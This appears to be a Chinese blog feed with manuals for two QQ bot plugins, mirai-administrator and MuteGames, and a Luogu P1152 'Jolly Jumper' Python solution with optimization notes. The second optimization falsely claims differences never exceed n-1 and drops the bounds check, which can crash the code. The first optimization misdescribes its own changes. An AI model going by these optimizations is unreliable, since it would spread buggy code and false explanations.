<td align="left"><code>/&lt;contact&gt; &lt;black&gt; &#123;permitteeIds&#125;</code></td>
<td align="left">拉黑</td>
</tr>
<tr>
<td align="left"><code>/&lt;contact&gt; &lt;white&gt; &#123;permitteeIds&#125;</code></td>
<td align="left">取消拉黑</td>
</tr>
<tr>
<td align="left"><code>/&lt;contact&gt; &lt;backup&gt;</code></td>
<td align="left">触发备份功能</td>
</tr>
</tbody></table>
<ol>
<li><code>id</code> 是 事件id 或 好友id 或 群id</li>
<li><code>accept</code> 和 <code>black</code> 参数为 <code>true</code>, <code>yes</code>, <code>enabled</code>, <code>on</code>, <code>1</code> 时表示 <code>true</code> (不区分大小写)</li>
<li>对 机器人发送的新联系人通知消息 回复 <code>同意</code> 或 <code>不同意</code> 或 <code>拉黑</code> 即可处理，详见 <a class="link"   href="https://mirai.mamoe.net/topic/972/mirai-administrator-%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%AE%A1%E7%90%86%E6%8F%92%E4%BB%B6-%E5%A5%BD%E5%8F%8B-%E7%BE%A4%E7%AE%A1%E7%90%86-%E9%BB%91%E5%90%8D%E5%8D%95-%E5%AE%B5%E7%A6%81/2?page=1#%E8%81%94%E7%B3%BB%E4%BA%BA%E5%AE%A1%E6%89%B9%E9%85%8D%E7%BD%AE" >联系人审批配置<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><code>permitteeIds</code> 是 权限系统的用户标识符，例如 <code>m12345.6789</code>, 可以提供多个 <a class="link"   href="https://github.com/mamoe/mirai/blob/dev/mirai-console/docs/Permissions.md#%E8%A2%AB%E8%AE%B8%E5%8F%AF%E4%BA%BA-id" >PermitteeId<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 一次性拉黑&#x2F;取消拉黑</li>
<li>黑名单通过 <code>@EventHandler(priority = EventPriority.HIGH, concurrency = ConcurrencyKind.LOCKED)</code> 拦截消息</li>
</ol>
<h3 id="ADMINFRIENDCOMMAND"><a href="#ADMINFRIENDCOMMAND" class="headerlink" title="ADMINFRIENDCOMMAND"></a>ADMINFRIENDCOMMAND</h3><table>
<thead>
<tr>
<th align="left">Command</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>/&lt;friend&gt; &lt;list&gt;</code></td>
<td align="left">好友列表</td>
</tr>
<tr>
<td align="left"><code>/&lt;friend&gt; &lt;delete&gt; [friend]</code></td>
<td align="left">删除好友</td>
</tr>
</tbody></table>
<h3 id="ADMINGROUPCOMMAND"><a href="#ADMINGROUPCOMMAND" class="headerlink" title="ADMINGROUPCOMMAND"></a>ADMINGROUPCOMMAND</h3><table>
<thead>
<tr>
<th align="left">Command</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>/&lt;group&gt; &lt;list&gt;</code></td>
<td align="left">群列表</td>
</tr>
<tr>
<td align="left"><code>/&lt;group&gt; &lt;member&gt; [group]</code></td>
<td align="left">群成员</td>
</tr>
<tr>
<td align="left"><code>/&lt;group&gt; &lt;quit&gt; [group]</code></td>
<td align="left">退出群聊</td>
</tr>
<tr>
<td align="left"><code>/&lt;group&gt; &lt;kick&gt; [member] [reason]? [black]?</code></td>
<td align="left">踢出群员</td>
</tr>
<tr>
<td align="left"><code>/&lt;group&gt; &lt;nick&gt; [member] [nick]</code></td>
<td align="left">群昵称</td>
</tr>
<tr>
<td align="left"><code>/&lt;group&gt; &lt;title&gt; [member] [title]</code></td>
<td align="left">群头衔</td>
</tr>
<tr>
<td align="left"><code>/&lt;group&gt; &lt;mute&gt; [member] [second]</code></td>
<td align="left">禁言</td>
</tr>
<tr>
<td align="left"><code>/&lt;group&gt; &lt;quiet&gt; [group] [open]?</code></td>
<td align="left">全体禁言</td>
</tr>
<tr>
<td align="left"><code>/&lt;group&gt; &lt;admin&gt; [member] [operation]?</code></td>
<td align="left">设置管理员</td>
</tr>
<tr>
<td align="left"><code>/&lt;group&gt; &lt;announce&gt; [group]</code></td>
<td align="left">设置公告</td>
</tr>
<tr>
<td align="left"><code>/&lt;group&gt; &lt;rank&gt; [group] &#123;levels&#125;</code></td>
<td align="left">设置等级头衔</td>
</tr>
</tbody></table>
<h3 id="ADMINRECALLCOMMAND"><a href="#ADMINRECALLCOMMAND" class="headerlink" title="ADMINRECALLCOMMAND"></a>ADMINRECALLCOMMAND</h3><table>
<thead>
<tr>
<th align="left">Command</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>/&lt;recall&gt; [contact]?</code></td>
<td align="left">撤回消息</td>
</tr>
</tbody></table>
<ol>
<li>不指定<code>contact</code>时，可以通过<strong>回复消息</strong>指定要撤销的消息，如果没有指定，将尝试撤销最后一条不是由指令发送者发送的消息</li>
<li><code>contact</code>是群员时，将尝试撤销这个群员的最后一条消息</li>
<li><code>contact</code>是群或好友时，将尝试撤销bot的最后一条消息</li>
</ol>
<h3 id="ADMINREGISTEREDCOMMAND"><a href="#ADMINREGISTEREDCOMMAND" class="headerlink" title="ADMINREGISTEREDCOMMAND"></a>ADMINREGISTEREDCOMMAND</h3><table>
<thead>
<tr>
<th align="left">Command</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>/&lt;registered&gt;</code></td>
<td align="left">查看已注册指令</td>
</tr>
<tr>
<td align="left"><code>/&lt;reg&gt;</code></td>
<td align="left">查看已注册指令</td>
</tr>
</tbody></table>
<h3 id="ADMINSENDCOMMAND"><a href="#ADMINSENDCOMMAND" class="headerlink" title="ADMINSENDCOMMAND"></a>ADMINSENDCOMMAND</h3><table>
<thead>
<tr>
<th align="left">Command</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>/&lt;send&gt; &lt;groups&gt; [bot]? [at]? [second]?</code></td>
<td align="left">发送给所有群</td>
</tr>
<tr>
<td align="left"><code>/&lt;send&gt; &lt;friends&gt; [bot]? [second]?</code></td>
<td align="left">发送给所有好友</td>
</tr>
<tr>
<td align="left"><code>/&lt;send&gt; &lt;to&gt; [contact] [at]?</code></td>
<td align="left">发送给指定联系人</td>
</tr>
<tr>
<td align="left"><code>/&lt;send&gt; &lt;nudge&gt; [user]</code></td>
<td align="left">戳一戳指定联系人</td>
</tr>
<tr>
<td align="left"><code>/&lt;send&gt; &lt;log&gt; &#123;addresses&#125;</code></td>
<td align="left">备份日志到邮箱</td>
</tr>
</tbody></table>
<ol>
<li><code>bot</code> 参数在命令行模式下需要指定</li>
<li><code>at</code> 参数为 <code>true</code>, <code>yes</code>, <code>enabled</code>, <code>on</code>, <code>1</code> 时表示 <code>true</code>, 将附加一个At</li>
<li><code>second</code> 参数为 延迟的秒数 例如 <code>/send groups 123456 false 10</code></li>
<li><code>addresses</code> 参数为 邮箱地址</li>
</ol>
<h3 id="ADMINTIMERCOMMAND"><a href="#ADMINTIMERCOMMAND" class="headerlink" title="ADMINTIMERCOMMAND"></a>ADMINTIMERCOMMAND</h3><table>
<thead>
<tr>
<th align="left">Command</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>/&lt;timer&gt; &lt;config&gt;</code></td>
<td align="left">显示当前设置</td>
</tr>
<tr>
<td align="left"><code>/&lt;timer&gt; &lt;mute&gt; [moment] [cron] [group]?</code></td>
<td align="left">宵禁</td>
</tr>
<tr>
<td align="left"><code>/&lt;timer&gt; &lt;cleaner&gt; [day] [cron] [group]?</code></td>
<td align="left">清理不发言</td>
</tr>
<tr>
<td align="left"><code>/&lt;timer&gt; &lt;status&gt; [cron] [bot]?</code></td>
<td align="left">定时发送机器人状态</td>
</tr>
<tr>
<td align="left"><code>/&lt;timer&gt; &lt;message&gt; [cron] [target] [at]</code></td>
<td align="left">定时发送消息</td>
</tr>
</tbody></table>
<ol>
<li><code>group</code> 为 要操作的群，在群聊中可以不指定</li>
<li><code>cron</code>, 为 CRON 表达式, 由 <code>秒 分钟 小时 日 月 周</code> 组成<br>例如 <code>0 0 1 * * ?</code> 表示每天 01:00 执行一次，<code>0 30 2 ? * 2-6</code> 表示星期一至星期五 每天 02:30 执行一次<br>可以使用在线编辑器生成 <a class="link"   href="https://www.bejson.com/othertools/cron/" >https://www.bejson.com/othertools/cron/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>为防止被 空格 分成多个参数，请使用 <code>&quot;</code> 包裹参数</li>
<li><code>moment</code> 为 DURATION 表达式, 由 <code>PnDTnHnMn.nS</code> 组成<br>例如 <code>P1DT2H3M4.5S</code> 表示 一天二小时三分钟四点五秒，<code>PT5H</code> 表示 五小时</li>
<li>mute 指令，moment 小于 <code>0</code> 宵禁就会关闭<br>例如 <code>/timer mute PT5H &quot;0 0 1 ? * 2-6&quot;</code>, 将会在 星期一到星期五的凌晨01:00 禁言 5 小时<br>例如 <code>/timer mute PT0S &quot;0 0 0 1 * ?&quot;</code>, 将会 取消 禁言定时器</li>
<li>day 单位为天数的发言期限, 小于 <code>0</code> 宵禁就会关闭<br>例如 <code>/timer cleaner 365 &quot;0 0 12 ? * 0&quot;</code>, 将会 取消 禁言定时器</li>
</ol>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="联系人审批配置"><a href="#联系人审批配置" class="headerlink" title="联系人审批配置"></a>联系人审批配置</h3><ol>
<li><code>AdminAutoApproverConfig.yml</code></li>
</ol>
<h3 id="禁言自动退群配置"><a href="#禁言自动退群配置" class="headerlink" title="禁言自动退群配置"></a>禁言自动退群配置</h3><ol>
<li><code>AdminAutoQuitConfig.yml</code></li>
<li><code>mute_limit</code> 大于这个设置秒数的禁言会触发自动退群</li>
</ol>
<h3 id="留言配置"><a href="#留言配置" class="headerlink" title="留言配置"></a>留言配置</h3><ol>
<li><code>AdminCommentConfig.yml</code></li>
<li><code>xyz.cssxsh.mirai.plugin.mirai-administrator:comment.include</code> 作用: 拥有此权限的用户，可以给机器人留言</li>
</ol>
<h3 id="机器人上线消息配置"><a href="#机器人上线消息配置" class="headerlink" title="机器人上线消息配置"></a>机器人上线消息配置</h3><ol>
<li><code>AdminOnlineMessageConfig.yml</code></li>
<li><code>xyz.cssxsh.mirai.plugin.mirai-administrator:online.include</code> 作用: 拥有此权限的群，会发送上线通知</li>
</ol>
<h3 id="消息审查及机器人所有者"><a href="#消息审查及机器人所有者" class="headerlink" title="消息审查及机器人所有者"></a>消息审查及机器人所有者</h3><ol>
<li><code>AdminSetting.yml</code></li>
<li><code>censor_types</code> 可选值 <code>IMAGE, FLASH, SERVICE, APP, AUDIO, FORWARD, VIP, MARKET, MUSIC, POKE</code></li>
<li>正则词库, 须手动添加，将会加载 censor 文件夹中的 txt 文件，每一行对应一个正则匹配，会监听文件改动，无需重启</li>
</ol>
<h3 id="邮件配置"><a href="#邮件配置" class="headerlink" title="邮件配置"></a>邮件配置</h3><ol>
<li><code>AdminMailConfig.yml</code> 配置一些默认的发送对象</li>
<li><code>admin.mail.properties</code> 配置邮箱账号等</li>
</ol>
<p>格式参考</p>
<div class="code-container" data-rel="Properties"><figure class="iseeu highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">mail.host</span>=<span class="string">smtp.mail.qq.com</span></span><br><span class="line"><span class="attr">mail.auth</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">mail.user</span>=<span class="string">xxx</span></span><br><span class="line"><span class="attr">mail.password</span>=<span class="string">***</span></span><br><span class="line"><span class="attr">mail.from</span>=<span class="string">cssxsh@qq.com</span></span><br><span class="line"><span class="attr">mail.store.protocol</span>=<span class="string">smtp</span></span><br><span class="line"><span class="attr">mail.transport.protocol</span>=<span class="string">smtp</span></span><br><span class="line"><span class="comment"># smtp</span></span><br><span class="line"><span class="attr">mail.smtp.starttls.enable</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">mail.smtp.auth</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">mail.smtp.timeout</span>=<span class="string">15000</span></span><br></pre></td></tr></table></figure></div>

<p>QQ邮箱帮助： <a class="link"   href="https://service.mail.qq.com/cgi-bin/help?subtype=1&&id=28&&no=1001256" >https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=28&amp;&amp;no=1001256<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>QQbot</tag>
      </tags>
  </entry>
  <entry>
    <title>MuteGames使用手册</title>
    <url>/posts/7183a269.html</url>
    <content><![CDATA[<h1 id="MuteGames"><a href="#MuteGames" class="headerlink" title="MuteGames"></a>MuteGames</h1><p>一个以 <a class="link"   href="https://github.com/mamoe/mirai" >Mirai-Console<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 为基础开发并为了满足群友PVP需求和抖M需求开发的禁言游戏集合</p>
<h2 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h2><p>插件需要以 <a class="link"   href="https://github.com/mamoe/mirai" >Mirai-Console<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>为基础，你可以下载 <a class="link"   href="https://github.com/iTXTech/mirai-console-loader/releases" >MCL<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 作为你的Mirai插件载入器</p>
<p>与此同时，本插件需要 Mirai 官方插件 </p>
<p>使用之前请先用参考<a href="#%E6%9D%83%E9%99%90%E8%8A%82%E7%82%B9">权限节点</a>来开启插件权限</p>
<p><strong>请注意：当用户权限大于等于机器人所在权限时（如机器人是管理员用户为群主），机器人不会对游戏请求做任何回复</strong></p>
<h2 id="权限节点"><a href="#权限节点" class="headerlink" title="权限节点"></a>权限节点</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">|- com.evolvedghost.mutegames:*                      The base permission</span><br><span class="line">|  |- com.evolvedghost.mutegames:command.banme       自裁指令</span><br><span class="line">|  |- com.evolvedghost.mutegames:command.blackjack   21点（Blackjack）指令</span><br><span class="line">|  |- com.evolvedghost.mutegames:command.duel        决斗指令</span><br><span class="line">|  |- com.evolvedghost.mutegames:command.mg          MuteGams管理指令</span><br><span class="line">|  |- com.evolvedghost.mutegames:command.roulette    俄罗斯轮盘指令</span><br></pre></td></tr></table></figure></div>

<p>插件调用的是Mirai自带的权限管理系统，你可以在控制台输入<code>?</code>来获取帮助，通常权限的添加方式为：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#permission add &lt;被许可人 ID&gt; &lt;权限 ID&gt;    # 授权一个权限</span><br></pre></td></tr></table></figure></div>

<p>&lt;被许可人 ID&gt; 可以为QQ号或者通配符<code>*</code>来代表所有用户</p>
<p>&lt;权限 ID&gt; 即上述权限名称，可按照需求添加</p>
<p>一个例子为：<code>#permission add * com.evolvedghost.mutegames:*</code>，即为所有用户添加本插件所有权限</p>
<h2 id="插件命令"><a href="#插件命令" class="headerlink" title="插件命令"></a>插件命令</h2><p>插件分为两种命令，一种为普通命令一种为管理员命令</p>
<p>默认别名为插件预设置的alias，普通命令的别名你可以在Config中更改</p>
<h3 id="普通命令"><a href="#普通命令" class="headerlink" title="普通命令"></a>普通命令</h3><table>
<thead>
<tr>
<th>指令</th>
<th>默认别名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><code>(#)banMe</code></td>
<td><code>自裁</code></td>
<td>自裁（直接获得一个禁言）</td>
</tr>
<tr>
<td><code>(#)banMe [seconds]&lt;Int&gt;</code></td>
<td><code>自裁 [seconds]&lt;Int&gt;</code></td>
<td>自定义秒数禁言</td>
</tr>
<tr>
<td><code>(#)duel</code></td>
<td><code>决斗</code></td>
<td>决斗指令（两位群友以决斗的方式赢取禁言）</td>
</tr>
<tr>
<td><code>(#)roulette</code></td>
<td><code>轮盘,俄罗斯轮盘</code></td>
<td>俄罗斯轮盘赌（以轮盘赌的方式赢取禁言）</td>
</tr>
<tr>
<td><code>(#)blackjack</code></td>
<td><code>21点</code></td>
<td>发起#加入一轮21点</td>
</tr>
<tr>
<td><code>(#)blackjack start</code></td>
<td><code>21点 开始</code></td>
<td>开启一轮21点</td>
</tr>
<tr>
<td><code>(#)blackjack add</code></td>
<td><code>21点 拿牌</code></td>
<td>在21点中拿牌</td>
</tr>
<tr>
<td><code>(#)blackjack stop</code></td>
<td><code>21点 停牌</code></td>
<td>在21点中停牌</td>
</tr>
<tr>
<td><code>(#)blackjack giveup</code></td>
<td><code>21点 投降</code></td>
<td>在21点中投降</td>
</tr>
<tr>
<td><code>(#)blackjack check</code></td>
<td><code>21点 看牌</code></td>
<td>在21点中看牌</td>
</tr>
<tr>
<td><code>(#)blackjack help</code></td>
<td><code>21点 帮助</code></td>
<td>获取21点帮助</td>
</tr>
</tbody></table>
<h3 id="管理命令"><a href="#管理命令" class="headerlink" title="管理命令"></a>管理命令</h3><table>
<thead>
<tr>
<th>指令</th>
<th>默认别名（不可更改）</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><code>#mg dualStop</code></td>
<td><code>#mg 停止决斗</code></td>
<td>停止本群的决斗</td>
</tr>
<tr>
<td><code>#mg reload</code></td>
<td><code>#mg 重载</code></td>
<td>重载本插件的配置项</td>
</tr>
<tr>
<td><code>#mg rouletteStop</code></td>
<td><code>#mg 停止轮盘</code></td>
<td>停止本群的俄罗斯轮盘</td>
</tr>
<tr>
<td><code>#mg bjStop</code></td>
<td><code>#mg 停止21点</code></td>
<td>停止本群的停止21点</td>
</tr>
</tbody></table>
<h2 id="插件配置"><a href="#插件配置" class="headerlink" title="插件配置"></a>插件配置</h2><p>插件的配置项储存在<code>config\com.evolvedghost.mutegames</code>目录下，有以下文件</p>
<table>
<thead>
<tr>
<th>文件名</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>admin.yml</code></td>
<td>配置管理员命令和插件基础设置</td>
</tr>
<tr>
<td><code>banMe.yml</code></td>
<td>配置自裁设置</td>
</tr>
<tr>
<td><code>duel.yml</code></td>
<td>配置决斗设置</td>
</tr>
<tr>
<td><code>roulette.yml</code></td>
<td>配置轮盘赌设置</td>
</tr>
<tr>
<td><code>blackjack.yml</code></td>
<td>配置21点设置</td>
</tr>
</tbody></table>
<p>相应的设置在文件中应有详细注明</p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>如果您需要自行编译，使用在文件目录使用以下命令即可</p>
<p>Windows：<code>.#gradlew.bat buildPlugin</code></p>
<p>Linux：<code>.#gradlew buildPlugin</code></p>
<p>Mirai版本在2.12以下的用户需要向下兼容包，本项目Release并不会提供此类包，请自行编译，编译指令为：<code>.#gradlew buildPluginLegacy</code></p>
<p>编译好的jar文件可以在<code>#build#mirai</code>下找到</p>
<h2 id="特别感谢"><a href="#特别感谢" class="headerlink" title="特别感谢"></a>特别感谢</h2><p><a class="link"   href="https://github.com/mamoe/mirai" >Mirai<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 提供QQ机器人</p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>QQbot</tag>
      </tags>
  </entry>
  <entry>
    <title>P1152 欢乐的跳</title>
    <url>/posts/8efd2bf.html</url>
    <content><![CDATA[<h1 id="欢乐的跳"><a href="#欢乐的跳" class="headerlink" title="欢乐的跳"></a>欢乐的跳</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>一个 $n$ 个元素的整数数组，如果数组两个连续元素之间差的绝对值包括了 $[1,n-1]$ 之间的所有整数，则称之符合“欢乐的跳”，如数组 ${1,4,2,3}$ 符合“欢乐的跳”，因为差的绝对值分别为：$3,2,1$。</p>
<p>给定一个数组，你的任务是判断该数组是否符合“欢乐的跳”。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>每组测试数据第一行以一个整数 $n(1 \le n \le 1000)$ 开始，接下来 $n$ 个空格隔开的在 $[-10^8,10^8]$ 之间的整数。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>对于每组测试数据，输出一行若该数组符合“欢乐的跳”则输出 <code>Jolly</code>，否则输出 <code>Not jolly</code>。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">4 1 4 2 3</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Jolly</span><br></pre></td></tr></table></figure></div>

<h2 id="样例-2"><a href="#样例-2" class="headerlink" title="样例 #2"></a>样例 #2</h2><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入 #2"></a>样例输入 #2</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 1 4 2 -1 6</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出 #2"></a>样例输出 #2</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Not jolly</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>$1 \le n \le 1000$</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">Jolly_input = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">n = Jolly_input[<span class="number">0</span>]</span><br><span class="line">Jolly = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(Jolly_input)):</span><br><span class="line">    Jolly.append(Jolly_input[i])</span><br><span class="line">w1 = [<span class="number">0</span>] * n</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">    abs_num = <span class="built_in">abs</span>(Jolly[i] - Jolly[i + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> abs_num &lt; n:</span><br><span class="line">        w1[abs_num] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> w1[<span class="number">1</span>:]:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Jolly&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not jolly&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="题解优化1"><a href="#题解优化1" class="headerlink" title="题解优化1"></a>题解优化1</h3><p>这段代码已经实现了判断数组是否符合“欢乐的跳”的功能，但仍然可以进行一些优化：</p>
<ol>
<li><p><strong>简化列表创建</strong>：在创建 <code>Jolly</code> 列表时，可以使用切片来简化代码。</p>
</li>
<li><p><strong>简化差的绝对值计算</strong>：可以在循环中直接计算差的绝对值，而不是使用 <code>abs()</code> 函数。</p>
</li>
<li><p><strong>简化检查逻辑</strong>：可以在循环中直接检查是否存在未被标记的差的绝对值，而不是使用计数器 <code>count</code>。</p>
</li>
<li><p><strong>使用生成器表达式</strong>：在最后判断是否存在未被标记的差的绝对值时，可以使用生成器表达式来判断，而不需要显式地创建一个计数器变量。</p>
</li>
</ol>
<p>下面是优化后的代码：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">Jolly_input = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">n = Jolly_input[<span class="number">0</span>]</span><br><span class="line">Jolly = Jolly_input[<span class="number">1</span>:]  <span class="comment"># 简化列表创建</span></span><br><span class="line"></span><br><span class="line">w1 = [<span class="number">0</span>] * n</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">    abs_num = <span class="built_in">abs</span>(Jolly[i] - Jolly[i + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> abs_num &lt; n:</span><br><span class="line">        w1[abs_num] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> w1[<span class="number">1</span>:]:  <span class="comment"># 使用生成器表达式检查是否存在未被标记的差的绝对值</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not jolly&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Jolly&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>通过这些优化，代码更加简洁和易读。</p>
<h3 id="题解优化2"><a href="#题解优化2" class="headerlink" title="题解优化2"></a>题解优化2</h3><p>这段代码可以进行一些优化，提高效率和简洁性。下面是一些可能的优化点：</p>
<ol>
<li><p><strong>不需要额外的 Jolly 列表：</strong> 可以在读取输入时直接忽略第一个元素，因为我们只关心元素之间的差值。</p>
</li>
<li><p><strong>不需要检查是否小于 n：</strong> 因为题目规定了连续元素之间的差的绝对值不超过 n-1，所以无需检查差的绝对值是否小于 n。</p>
</li>
<li><p><strong>不需要额外的计数器 count：</strong> 可以直接利用 w1 列表来判断是否存在未被标记的差的绝对值。</p>
</li>
<li><p><strong>优化遍历 w1 列表的方式：</strong> 可以使用 Python 的内置函数 <code>any()</code> 来判断列表中是否存在某个条件成立的元素。</p>
</li>
</ol>
<p>下面是优化后的代码：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">Jolly_input = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">n = Jolly_input[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">w1 = [<span class="number">0</span>] * n</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">    abs_num = <span class="built_in">abs</span>(Jolly_input[i] - Jolly_input[i + <span class="number">1</span>])</span><br><span class="line">    w1[abs_num] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">any</span>(i == <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> w1[<span class="number">1</span>:]):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not jolly&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Jolly&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>这样，我们消除了额外的 Jolly 列表、计数器 count，并且更简洁地判断是否存在未被标记的差的绝对值。</p>
<h2 id="题解解释"><a href="#题解解释" class="headerlink" title="题解解释"></a>题解解释</h2><blockquote>
<p>来自ChatGPT</p>
</blockquote>
<p>这段代码用于判断给定的整数数组是否符合“欢乐的跳”的条件。下面是代码的解释：</p>
<ol>
<li><p><code>Jolly_input = list(map(int, input().split()))</code>: 这行代码接受用户输入的整数数组，并将其转换为整数列表。</p>
</li>
<li><p><code>n = Jolly_input[0]</code>: 获取输入列表的第一个元素，该元素表示数组的长度。</p>
</li>
<li><p><code>Jolly = []</code>: 创建一个空列表 <code>Jolly</code> 用于存储输入列表中除了第一个元素以外的所有元素。</p>
</li>
<li><p><code>for i in range(1, len(Jolly_input)): Jolly.append(Jolly_input[i])</code>: 这个循环将输入列表中除了第一个元素以外的所有元素添加到 <code>Jolly</code> 列表中。</p>
</li>
<li><p><code>w1 = [0] * n</code>: 创建一个长度为 <code>n</code> 的全零列表 <code>w1</code>，用于记录数组中差的绝对值。</p>
</li>
<li><p><code>for i in range(n - 1):</code>: 这个循环遍历数组中的每对连续元素。</p>
</li>
<li><p><code>abs_num = abs(Jolly[i] - Jolly[i + 1])</code>: 计算当前元素和下一个元素的差的绝对值。</p>
</li>
<li><p><code>if abs_num &lt; n: w1[abs_num] = 1</code>: 如果差的绝对值小于 <code>n</code>，则将 <code>w1</code> 列表中索引为差的绝对值的元素标记为 1，表示该差的绝对值出现过。</p>
</li>
<li><p><code>count = 0</code>: 初始化一个计数器 <code>count</code> 为 0，用于检查是否存在欢乐的跳。</p>
</li>
<li><p><code>for i in w1[1:]:</code>: 这个循环遍历 <code>w1</code> 列表中除了第一个元素以外的所有元素。</p>
</li>
<li><p><code>if i == 0: count = 1</code>: 如果 <code>w1</code> 中有任何一个元素为 0，说明存在未被标记的差的绝对值，将 <code>count</code> 设置为 1。</p>
</li>
